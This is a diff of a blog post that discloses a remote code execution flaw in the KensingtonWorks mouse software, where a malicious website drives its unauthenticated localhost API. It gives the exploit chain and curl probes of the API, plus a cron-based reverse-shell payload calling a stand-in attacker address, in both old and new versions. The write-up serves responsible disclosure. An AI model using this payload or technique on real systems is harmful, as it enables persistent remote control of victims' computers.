@@ -1,38 +1,30 @@
 ---
 layout: post
-title: How to exploit a Remote Code Execution vulnerability in KensingtonWorks device manager
+title: Remote code execution vulnerability in KensingtonWorks device manager
 tags: [Security]
 og_image: TODO
-published: false
 ---
-[KensingtonWorks][kw] is a tool that allows users to add power functionality to their Kensington mice. As of 2020-06-04 it contains an unpatched vulnerability that allows an attacker to use it to remotely execute arbitrary code on a victim's computer.
-
-I've tried to contact Kensington via every channel I can think of in order to responsibly disclose this flaw, but I haven't heard anything back other than one "OK cool we'll look into it". I sent my first message on 2020-03-09, when I said that I would wait for 90 days before publishing details of the vulnerability so as to give them time to fix it.
-
-This period expired on 2020-06-07, so in this post I'll describe how the vulnerability works and how I stumbled across it.
-
-## Vulnerability summary
-
-To exploit the bug, the attacker lures the victim to a malicious website. This website uses JavaScript to send HTTP requests to a local web server run by KensingtonWorks. These requests trick KensingtonWorks into physically opening the users terminal application, then pasting and executing the attacker's payload commands. No user interaction with the page is required.
-
-<img src="/images/kensington-poc.gif" />
-
-I've only tested the vulnerability on vTODO on OSX, but it seems reasonable to assume that it applies to all older versions on all operating systems. The vulnerability is currently unpatched, meaning that the latest version of KensingtonWorks is vulnerable.
-
-To mitigate the flaw, users should either:
-
-* Uninstall KensingtonWorks and use their Kensington devices without the extra configuration that it provides (recommended)
-* If this is not possible, it appears that disconnecting all Kensington devices also mitigates the vulnerability
-
-## Backstory
-
-Back in February, Twitter user ProfessaChapman sent me a tipoff:
+Back in February, a Twitter user who has asked to remain anonymous sent me a tipoff. They had noticed some odd behavior by [KensingtonWorks][kw], a piece of software that allows its users to add power functionality to mice made by Kensington, a popular brand of peripherals.
 
 <img src="/images/kensington-twitter-dm.png" />
 
-I was intrigued. My dad owns several Kensington devices, and if you mess with my dad then, well, I'd prefer if you didn't. I agreed with ProfessaChapman that listening on a network port was a strange thing for KensingtonWorks to do. It shouldn't need to receive any network connections in order to manage its user's mice. However, I suspected that this listening was more likely to be a security problem than a privacy one. From a privacy perspective there's nothing intrinsically problematic about listening on a network port; but from a security point of view it increases the application's attack surface area and gives the developers more ways in which they can make mistakes.
+KensingtonWorks was listening on a TCP network port, allowing other programs on the user's computer to connect to it. There's nothing necessarily wrong with this, but it was still a strange thing for KensingtonWorks to do. It shouldn't need to receive any network connections in order to manage its users' mice. I was intrigued. My dad owns several Kensington devices, and if you mess with my dad then, well, I'd prefer if you didn't. I started digging.
 
-I peered closer. The `127.0` at the edge of FeloniusPunk's screenshot suggested that KensingtonWorks was only listening on the local *loopback interface*. This at least meant that the application was only accessible to other programs running on the user's machine, and not to other machines on their network. Nonetheless, I couldn't think of a good reason for KensingtonWorks to open up even a local network port. As Sherlock Holmes might have said, once you eliminate all the good reasons for doing something, all that's left are the questionable ones. I decided to take a closer look.
+The result of said shovelwork was a vulnerability that allows an attacker to remotely execute arbitrary code on a victim's computer. I disclosed this flaw to Kensington on 2020-03-09, when I said that I would wait for 90 days before publishing details of the vulnerability to give them time to fix it. They have not been in contact with me since, but they appear to have recently mitigated the most harmful effects of the vulnerability, preventing it from being used to execute arbitrary code. However, they haven't patched the root cause, and an attacker can still use the same pattern to secretly mess with the user's KensingtonWorks settings. Users should either upgrade to v2.1.17 or uninstall the product until the remaining, less severe flaw is fixed, depending on their risk tolerance.
+
+In this post I'll describe how the vulnerability works and how I found it.
+
+## Vulnerability summary
+
+To exploit the bug, the attacker lures their victim to a malicious website. The attacker's website use JavaScript to send HTTP requests to an unsecured local web server run by KensingtonWorks. These requests trick KensingtonWorks into physically opening the users terminal application, then pasting and executing the attacker's payload commands. No user interaction with the page is required.
+
+<img src="/images/kensington-poc.gif" />
+
+## The backstory
+
+Back to my DMs. My correspondant had sent me the screenshots in response to my request for [suspected privacy abuses][priv], but I suspected that this was more likely to be a security problem than a privacy one. From a privacy perspective there's nothing intrinsically problematic about listening on a network port; but from a security point of view it increases the application's attack surface area and gives the developers more ways in which they can make mistakes.
+
+I peered closer. The `127.0` at the edge of my correspondant's screenshot suggested that KensingtonWorks was only listening on the local *loopback interface*. This at least meant that the application was only accessible to other programs running on the user's machine, and not to other machines on their network. Nonetheless, I couldn't think of a good reason for KensingtonWorks to open up even a local network port. As Sherlock Holmes might have said, once you eliminate all the good reasons for doing something, all that's left are the questionable ones. I decided to take a closer look.
 
 I downloaded and installed KensingtonWorks. First I confirmed that it really was only listening on `lo0`, the loopback interface:
 
@@ -44,7 +36,7 @@ It was indeed, so next I wanted to see what information was being sent to its po
 
 Traffic appeared in Wireshark immediately. Something was pinging the KensingtonWorks server every few seconds with an HTTP `GET` request to a URL with the path `/devices`. The KensingtonWorks server was sending back the response `[]`. This was good news - since KensingtonWorks was using HTTP it would be straightforward to fiddle with.
 
-However, the most important part of the HTTP request was the part that wasn't there: authentication.
+However, the most important part of the HTTP request was the part that wasn't there - authentication.
 
 <img src="/images/kensington-slash-devices.png" />
 
@@ -58,7 +50,7 @@ Connection: close
 
 Since there were no long, gibberish-looking tokens in the `/devices` request, it was pesos to pizza that the KensingtonWorks server was not protected by any kind of password or key. This meant that any program able to send HTTP requests to the server could perform the same actions as the official Kensington program that was sending those pings to `/devices`.
 
-In particular, it occurred to me that if an attacker could trick a user into visiting a malicious website then that website could use JavaScript to send background HTTP requests to `http://localhost:9090`. The attacker wouldn't be able to read any data returned by the local KensingtonWorks server because browsers prevent pages from reading responses returned from other domains (unless the other domain is using [*Cross-Origin Resource Sharing* (CORS)][cors]). However, I figured that it was likely that some endpoints on the KensingtonWorks server were used to *update* configuration settings. An attacker could send requests to these endpoints with no problems. They still wouldn't get to see the responses, but they wouldn't care because in this situation the requests are what do the damage.
+In particular, it occurred to me that if an attacker could trick a user into visiting a malicious website then that website could use JavaScript to send background HTTP requests to `http://localhost:9090`. The attacker wouldn't be able to read any data returned by the local KensingtonWorks server because browsers prevent pages from reading responses returned from other domains (unless the other domain is using [*Cross-Origin Resource Sharing* (CORS)][cors]). However, I figured that it was likely that some endpoints on the KensingtonWorks server were used to *update* configuration settings. An attacker could send requests to these endpoints with no problems. They still wouldn't get to see the responses, but this wouldn't matter because in this situation the requests are what do the damage.
 
 This said, all I had so far was the `GET /devices` endpoint. This wasn't going to compromise any computers. I needed to find additional endpoints that would allow me to fiddle with the KensingtonWork's settings and cause some mischief. I clicked around the application and monitored Wireshark, trying to trigger more HTTP requests. But without any Kensington devices plugged the application was almost empty.
 
@@ -94,7 +86,7 @@ Returning to my search results, the file that sounded most promising was the one
 ^@HTTP/1.1 400 Bad Request^@device^@ap
 p^@127.0.0.1^@GET^@^/favapps$^@^/devic
 es$^@^/config/apps$^@DELETE^@^/devices
-/([0-9]+)/emulatebuttonclick/([0-9]+)$
+/([0-9]+)/emulatebuttonclick/([0-9]+)$ <--- INTERESTING
 ^@^/config$^@^/config/general$^@^/conf
 ig/buttons$^@^/config/pointer$^@^/conf
 ig/scroll$^@^/config/snippets^@command
@@ -107,7 +99,7 @@ ig/scroll$^@^/config/snippets^@command
 
 This looked like a handy list of all the API endpoints in the KensingtonWorks server. The various `/config/...` endpoints sounded useful, but the one that caught my eye was `/devices/([0-9]+)/emulatebuttonclick/([0-9]+)` on the fifth line. Emulating a button click sounded like a great way to do something nasty to a victim's computer. I didn't know what to replace those `([0-9]+)` placeholders with, but suspected that if I bought myself a mouse then I would soon find out.
 
-Before I shelled out £40 for a mouse I didn't actually want, I wanted to make absolutely certain that the product met my high standards of insecurity. I tried probing the `/config/...` endpoints that I'd seen in the `[...]/MacOS/KensingtonWorksHelper` file (see above). I made some `GET` requests to my local KensingtonWorks server:
+Before I shelled out £40 for a mouse I didn't actually want, I wanted to make one final check that the product met my high standards of insecurity. I tried probing the `/config/...` endpoints that I'd seen in the `[...]/MacOS/KensingtonWorksHelper` file (see above). I made some `GET` requests to my local KensingtonWorks server:
 
 ```bash
 $ curl localhost:9090/config
@@ -124,7 +116,8 @@ $ curl localhost:9090/config/general
 {"timeStamp":"2020-04-16T17-34-17.000Z","trayIcon":true}
 
 # Update the state
-$ curl localhost:9090/config/general -X POST -d "{\"trayIcon\": false}"
+$ curl localhost:9090/config/general \
+    -X POST -d "{\"trayIcon\": false}"
 {"timeStamp":"2020-04-16T17-34-17.000Z","trayIcon":false}
 
 # Confirm that the state has changed - trayIcon
@@ -188,7 +181,7 @@ I updated my attack website to use the `/config/buttons` endpoint to bind my sid
 
 This configuration caper was on its own already an exploit of sorts, but it was a bit of a boring one. In order to weaponize it I would need to understand the `emulatebuttonclick` endpoint. I hadn't been able to find any way of triggering it from the UI, and the only place I had seen it mentioned was in the compiled application code.
 
-Fortunately, it wasn't hard to infer how the endpoint worked. In the KensingtonWorks code the endpoint was written as `/devices/([0-9]+)/emulatebuttonclick/([0-9]+)`. It seemed likely that the placeholders represented device and button IDs, as were in the params of the `/config/buttons` endpoint. I guessed that the new endpoint was expecting a `POST` request rather than a `GET` one, because it sounded like it would cause something to happen, rather than simply retrieving information. I used KensingtonWorks to bind my side button to the "screenshot" command, and used `curl` to hit the `emulatebuttonclick` endpoint with the correct device and buttons IDs.
+Fortunately, it wasn't hard to infer how the endpoint worked. In the KensingtonWorks code the endpoint was written as `/devices/([0-9]+)/emulatebuttonclick/([0-9]+)`. It seemed likely that the placeholders represented device and button IDs, like in the params of the `/config/buttons` endpoint. I guessed that the new endpoint was expecting a `POST` request rather than a `GET` one, because it sounded like it would cause something to happen, rather than simply retrieving information. I used KensingtonWorks to bind my side button to the "screenshot" command, and used `curl` to hit the `emulatebuttonclick` endpoint with the correct device and buttons IDs.
 
 ```bash
 $ curl localhost:9090/devices/12345/emulatebuttonclick/4
@@ -203,7 +196,7 @@ Now all that remained was to string everything together in an exploit website. I
 1. Use the "paste" command to paste and execute my payload bash command
 1. Use the "quit" command to exit the terminal and clean up after myself
 
-My payload bash command would be something like `crontab -l | { cat; echo "*/5 * * * * nc -e /bin/sh MY.IP.ADDR.ESS 1234"; } | crontab -`. This command creates a cron job that connects back to my machine every 5 minutes, giving me a persistent *reverse shell* that I can use to control the victim's machine. After establishing a connection I could sniff around on the target machine, try to escalate to root privileges, or simply add the machine to a botnet.
+My payload bash command would be something like `crontab -l | { cat; echo "*/5 * * * * nc -e /bin/sh ATTACKER.IP.ADDR.ESS 1234"; } | crontab -`. This command creates a cron job that connects back to my machine every 5 minutes, giving me a persistent *reverse shell* that I can use to control the victim's machine. After establishing a connection I could sniff around on the target machine, try to escalate to root privileges, or simply add the machine to a botnet.
 
 I wrote a library (not shown in this post so as to make a would-be attacker's life at least slightly challenging) that allowed me to write exploit JavaScript that looked like this:
 
@@ -239,13 +232,13 @@ I added my library and implementation code to my webpage and refreshed it. The c
 
 <img src="/images/kensington-poc.gif" />
 
-### How do we work out device IDs?
+### How do we find the device ID?
 
-Given a device ID, I could now execute arbitrary code on a victim's machine and compromise it. However, I still didn't know how device IDs wer generated. Were they fixed and predictable, or would I need to brute-force them by trying every possible ID between 0 and 99,999 until one worked? I could have bought more Kensington mice to try to see if the device ID varied between different products or between different instances of the same product. But I was already out £40 for one mouse that I was never going to use, so I assumed the worst case (depending on your morals and point of view) approach of randomization and started putting together a way to brute force the device ID.
+Given a device ID, I could now execute arbitrary code on a victim's machine and compromise it. However, I still didn't know how device IDs were generated. Were they fixed and predictable, or would I need to brute-force them by trying every possible ID between 0 and 99,999 until one worked? I could have bought more Kensington mice to try to see if the device ID varied between different products or between different instances of the same product. But I was already out £40 for one mouse that I was never going to use, so I assumed the worst case (depending on your morals and point of view) approach of randomization and started putting together a way to brute force the device ID.
 
 I'd need to keep trying requests with different device IDs until one of them worked. However, because of Cross-Origin Resource Sharing (CORS) restrictions, my JavaScript wouldn't get to see *anything* about the response sent by the KensingtonWorks server, not even whether it succeeded or failed. I'd need to work around these protections somehow.
 
-My first thought was to use a timing attack. My JavaScript didn't get to see any of the KensingtonWorks response's contents, but it did get to see when the response arrived. I checked whether there was a difference in request duration between requests with valid and invalid IDs. There wasn't. However, I realized that I could use the same bind/emulatebuttonclick combination as before to report a request's outcoe back to my script via a sneaky side-channel. To do this I wrote a script that:
+My first thought was to use a timing attack. My JavaScript didn't get to see any of the KensingtonWorks response's contents, but it did get to see when the response arrived. I checked whether there was a difference in request duration between requests with valid and invalid IDs. There wasn't. However, I realized that I could use the same bind/emulatebuttonclick combination as before to report a request's outcome back to my script via a sneaky side-channel. To do this I wrote a script that:
 
 1. Registered a JavaScript `onpaste` callback to trigger some code whenever the website saw that the user had invoked the "paste" command
 1. Used KensingtonWorks to bind a mouse button to the "paste" command
@@ -262,9 +255,9 @@ An hour is admittedly a long time to require a victim to stay on a website, alth
 
 ## Conclusion
 
-I've contacted Kensington via every channel I can think of to tell them about this flaw, but I haven't heard anything back other than a single "OK cool we'll look into it". I don't know if they intend to patch the vulnerability, and until they do I'd strongly recommend that KensingtonWorks users uninstall the product and go back to copying and pasting their text the old-fashioned way.
+To mitigate this vulnerability Kensington appear to have removed the `emulatebuttonclick` endpoint from KensingtonWorks. This means that an attacker can no longer use the above process to actually execute code. However, Kensington haven't updated KensingtonWorks's overall security model, so an attacker can still use the first half of the process to silently re-bind shortcut buttons. This bug should be fixed too, but it isn't a must-uninstall showstopper.
 
-In my opinion KensingtonWorks should ditch the local web server model altogether. It's bad manners to leave an unnecessary local web server lying around, as well as increasing the program's attack surface area. If this isn't an option, the developers should at least generate a random key when KensingtonWorks is installed and use it to verify that requests to the server are coming from the geniune KensingtonWorks client
+In my opinion KensingtonWorks should ditch the local web server model altogether. It's bad manners to leave an unnecessary local web server lying around, and it also increases the program's attack surface area. If making this change isn't an option, the developers should at least generate a random key when KensingtonWorks is installed and use it to verify that requests to the server are coming from the geniune KensingtonWorks client
 
 Have a look to see what programs are listening on network ports on your own computer. For example, on OSX see what you find when you run:
 
@@ -272,8 +265,9 @@ Have a look to see what programs are listening on network ports on your own comp
 $ lsof -nP -iTCP | grep LISTEN
 ```
 
-If you see anything interesting then keep on digging, or at least let me know what you've found and I'll see if I can't help with some of the spadework.
+If you see anything interesting then keep on digging, or at least [let me know what you've found](/about) and I'll see if I can help.
 
 [wireshark]: https://www.wireshark.org/
 [cors]: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
 [kw]: https://www.kensington.com/en-gb/software/kensingtonworks/
+[priv]: https://robertheaton.com/2020/02/07/send-me-your-privacy-abuse-tipoffs/
